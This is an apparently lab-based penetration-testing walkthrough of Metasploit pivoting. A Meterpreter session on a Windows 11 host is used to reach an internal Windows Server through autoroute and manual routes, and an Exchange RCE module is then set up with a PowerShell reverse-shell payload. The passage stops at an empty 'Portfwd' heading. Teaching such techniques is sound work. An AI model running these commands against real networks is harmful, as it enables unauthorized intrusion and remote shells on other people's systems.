## Target Environment Setup
- Kali Machine
	- Internal: None
	- External: 172.19.182.171
- Windows 11 Machine (used as pivot)
	- Internal: 169.254.16.221
	- External: 172.19.185.34
- Windows Server 2019 Machine (final target)
	- Internal: 169.254.204.110
	- External: None

## Initial Session Setup
Lets grab a session on the Windows 11 machine. We will assume we get a shell via some exploit or a backdoored file however to keep things simple here we will just go with some malicious EXE that the user clicks on:

```
msf6 payload(windows/x64/meterpreter/reverse_tcp) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 172.19.185.34
RHOST => 172.19.185.34
msf6 exploit(multi/handler) > exploit

[*] Started bind TCP handler against 172.19.185.34:4444
[*] Sending stage (200262 bytes) to 172.19.185.34
[*] Meterpreter session 1 opened (172.19.182.171:40601 -> 172.19.185.34:4444 ) at 2022-04-07 14:29:04 -0500

meterpreter > sysinfo
Computer        : WIN11-TEST
OS              : Windows 10 (10.0 Build 22000).
Architecture    : x64
System Language : en_US
Domain          : TESTINGDOMAIN
Logged On Users : 10
Meterpreter     : x64/windows
meterpreter > getuid
Server username: WIN11-TEST\normal
meterpreter > 
```

Now that we have the session we need to check how many interfaces it has. In the case of a dual-homed host, usually one interface is used for the internal network and the other for the external network. Multi-homed hosts might also be encountered in which case the host will have multiple network interfaces, each connecting to different networks, making it possible to use the compromised host to access multiple networks. We can check how many network interfaces are on a host using the `ifconfig` or `ipconfig` commands of Meterpreter:

```
meterpreter > ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 13
============
Name         : Microsoft Hyper-V Network Adapter
Hardware MAC : 00:15:5d:a6:01:6e
MTU          : 1500
IPv4 Address : 169.254.16.221
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::50bc:6e8c:df16:10dd
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 14
============
Name         : Microsoft Hyper-V Network Adapter #2
Hardware MAC : 00:15:5d:a6:01:7c
MTU          : 1500
IPv4 Address : 172.19.185.34
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::f9ca:9a25:df4c:3687
IPv6 Netmask : ffff:ffff:ffff:ffff::

meterpreter > 
```
We can ignore the loopback interface since that isn't of importance to us here (we don't want to communicate only with the host we have compromised after all), and instead we will focus on the other two interfaces. We can see that each of these belong to separate networks, specifically 169.254.0.0/16 and 172.16.0.0/20.

We know that the 172.16.0.0/20 network is the external network since our attacker machine is on this network, and we want to reach the host 169.254.204.110 containing the Windows Server 2019 host on the internal network. We can also see that our compromised Windows 11 host has a second network adapter that belongs to the same network address range as Windows Server 2019. We can test this theory by trying to ping 169.254.204.110 from the compromised host. This assumes that 169.254.204.110 does not have a firewall in place that would otherwise drop or block these ping requests however, so its not the most reliable of tests, however as can be seen below we can confirm we are on the same network and are able to reach 169.254.204.110.

```
meterpreter > shell
Process 8476 created.
Channel 1 created.
Microsoft Windows [Version 10.0.22000.593]
(c) Microsoft Corporation. All rights reserved.

C:\Users\normal\Desktop>ping 169.254.204.110
ping 169.254.204.110

Pinging 169.254.204.110 with 32 bytes of data:
Reply from 169.254.204.110: bytes=32 time<1ms TTL=128
Reply from 169.254.204.110: bytes=32 time<1ms TTL=128
Reply from 169.254.204.110: bytes=32 time<1ms TTL=128
Reply from 169.254.204.110: bytes=32 time<1ms TTL=128

Ping statistics for 169.254.204.110:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms

C:\Users\normal\Desktop>
```

Now we need to add our route to the target in such a way that Metasploit knows to use the session we have obtained on the Windows 11 machine as a pivot to route our traffic through to the Windows Server 2019 box at 169.254.204.110. Lets look at a couple of methods to do this.

## AutoRoute
One of the easiest ways to do this is to use the `post/multi/manage/autoroute` module which will help us automatically add in routes for the target to Metasploit's routing table so that Metasploit knows how to route traffic through the session that we have on the Windows 11 box and to the target Windows Server 2019 box. Lets look at a sample run of this command:

```
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/manage/autoroute 
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, auto
                                       add, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 169.254.0.0
SUBNET => 169.254.0.0
msf6 post(multi/manage/autoroute) > set NETMASK /16
NETMASK => /16
msf6 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, auto
                                       add, print, delete, default)
   NETMASK  /16              no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION  1                yes       The session to run this module on
   SUBNET   169.254.0.0      no        Subnet (IPv4, for example, 10.10.10.0)

msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against WIN11-TEST
[*] Searching for subnets to autoroute.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.19.176.0/255.255.240.0 from host's routing table.
[*] Post module execution completed
msf6 post(multi/manage/autoroute) > 
```
If we now use Meterpreter's `route` command we can see that we have two route table entries within Metasploit's routing table, that are tied to Session 1, aka the session on the Windows 11 machine. This means anytime we want to contact a machine within one of the networks specified, we will go through Session 1 and use that to connect to the targets.

```
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   172.19.176.0       255.255.240.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) > 
```

All right so that's one way, but what if we wanted to do this manually? First off to flush all routes from the routing table, we will do `route flush` followed by `route` to double check we have successfully removed the entires.

```
msf6 post(multi/manage/autoroute) > route flush
msf6 post(multi/manage/autoroute) > route
[*] There are currently no routes defined.
msf6 post(multi/manage/autoroute) > 
```
Now lets trying doing the same thing manually.

## Route
Here we can use `route add <IP ADDRESS OF SUBNET> <NETMASK> <GATEWAY>` to add the routes from within Metasploit, followed by `route print` to then print all the routes that Metasploit knows about. Note that the Gateway parameter is either an IP address to use as the gateway or as is more commonly the case, the session ID of an existing session to use to pivot the traffic through.

```
msf6 post(multi/manage/autoroute) > route add 169.254.0.0 255.255.0.0 1
[*] Route added
msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240 1
[-] Invalid gateway
msf6 post(multi/manage/autoroute) > route add 172.19.176.0 255.255.240.0 1
[*] Route added
msf6 post(multi/manage/autoroute) > route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1
   172.19.176.0       255.255.240.0      Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) > 
```

Finally we can check that the route will use session 1 by using `route get 169.254.204.110`

```
msf6 post(multi/manage/autoroute) > route get 169.254.204.110
169.254.204.110 routes through: Session 1
msf6 post(multi/manage/autoroute) > 
```

If we want to then remove a specific route (such as in this case we want to remove the 172.19.176.0/20 route since we don't need that for this test), we can issue the `route del` or `route remove` commands with the syntax `route remove <IP ADDRESS OF SUBNET><NETMASK IN SLASH FORMAT> <GATEWAY>`

Example:

```
msf6 post(multi/manage/autoroute) > route remove 172.19.176.0/20 1
[*] Route removed
msf6 post(multi/manage/autoroute) > route

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   169.254.0.0        255.255.0.0        Session 1

[*] There are currently no IPv6 routes defined.
msf6 post(multi/manage/autoroute) > 
```

# Using the Pivot
At this point we can now use the pivot with any Metasploit modules as shown below:

```
msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) > show options

Module options (exploit/windows/http/exchange_chainedserializationbinder_denylist_typo_rce):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  thePassword      yes       The password to use to authenticate to the Ex
                                            change server
   HttpUsername  administrator    yes       The username to log into the Exchange server
                                            as
   Proxies                        no        A proxy chain of format type:host:port[,type:
                                            host:port][...]
   RHOSTS        169.254.204.110  yes       The target host(s), see https://github.com/ra
                                            pid7/metasploit-framework/wiki/Using-Metasplo
                                            it
   RPORT         443              yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host or network interface to listen
                                             on. This must be an address on the local mac
                                            hine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8080             yes       The local port to listen on.
   SSL           true             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is
                                            randomly generated)
   TARGETURI     /                yes       Base path
   URIPATH                        no        The URI to use for this exploit (default is r
                                            andom)
   VHOST                          no        HTTP server virtual host


Payload options (cmd/windows/powershell_reverse_tcp):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LHOST         172.19.182.171   yes       The listen address (an interface may be speci
                                            fied)
   LOAD_MODULES                   no        A list of powershell modules separated by a c
                                            omma to download over the web
   LPORT         4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Command


msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) > check

[*] Target is an Exchange Server!
[*] 169.254.204.110:443 - The target is not exploitable. Exchange Server 15.2.986.14 does not appear to be a vulnerable version!
msf6 exploit(windows/http/exchange_chainedserializationbinder_denylist_typo_rce) > 
```
# Pivoting External Tools
## Portfwd